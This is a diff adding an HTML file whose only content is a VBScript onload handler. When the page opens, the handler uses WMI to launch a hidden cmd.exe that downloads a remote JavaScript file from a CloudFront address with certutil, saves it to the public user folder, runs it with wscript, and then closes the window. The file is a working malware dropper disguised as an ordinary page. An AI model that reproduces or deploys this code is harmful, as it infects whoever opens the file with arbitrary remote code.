@@ -1,0 +1,19 @@
+<html>
+<head>
+<script language="VBScript">
+Sub window_onload
+	const impersonation = 3
+	Const HIDDEN_WINDOW = 12
+	Set Locator = CreateObject("WbemScripting.SWbemLocator")
+	Set Service = Locator.ConnectServer()
+	Service.Security_.ImpersonationLevel=impersonation
+	Set objStartup = Service.Get("Win32_ProcessStartup")
+	Set objConfig = objStartup.SpawnInstance_
+	objConfig.ShowWindow = HIDDEN_WINDOW
+	Set Process = Service.Get("Win32_Process")
+	Error = Process.Create("cmd.exe /c certutil.exe -urlcache -split -f https://dl6zxn23r8r14.cloudfront.net:443/en-US C:\Users\Public\en-US.js && wscript.exe C:\Users\Public\en-US.js", null, objConfig, intProcessID)
+	window.close()
+end sub
+</script>
+</head>
+</html>
